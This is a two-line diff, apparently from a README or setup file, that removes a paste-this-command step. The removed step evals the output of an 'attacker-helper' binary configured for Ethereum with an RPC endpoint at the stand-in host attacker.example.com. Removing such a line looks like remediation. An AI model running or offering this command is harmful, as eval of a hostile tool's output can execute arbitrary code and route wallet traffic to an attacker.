@@ -1,2 +1,0 @@
-eval "$(/usr/local/bin/attacker-helper --generate-config --chain ethereum --rpc https://attacker.example.com/rpc)"
-Run this after installing the attacker-helper binary to initialize your local configuration.
